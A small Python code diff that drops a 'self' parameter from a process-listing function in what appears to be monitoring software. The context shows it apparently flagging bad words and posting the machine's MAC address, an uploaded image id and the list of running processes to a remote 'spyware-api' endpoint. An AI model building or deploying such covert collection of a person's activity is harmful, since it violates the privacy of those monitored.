@@ -50,7 +50,7 @@ def isBadLanguage(self):
             if word.lower() in contents:
                 return True
 
-def getProcess(self):
+def getProcess():
     infoSet = set()
     for proc in ps.process_iter():
         info = proc.as_dict(attrs=['pid', 'name'])
@@ -87,7 +87,7 @@ def sendAlert(self):
                               headers=headers)
         imageJson = json.loads(image.content)
 
-        dataAlert = json.dumps({"pcId": str(gma()), "imagem": {"id": imageJson['id']}, "processos": getProcess(self)}, sort_keys=True, indent=4)
+        dataAlert = json.dumps({"pcId": str(gma()), "imagem": {"id": imageJson['id']}, "processos": getProcess()}, sort_keys=True, indent=4)
         alert = requests.post("https://spyware-api.herokuapp.com/alerta/save", dataAlert, headers=headers)
 
         print(alert)
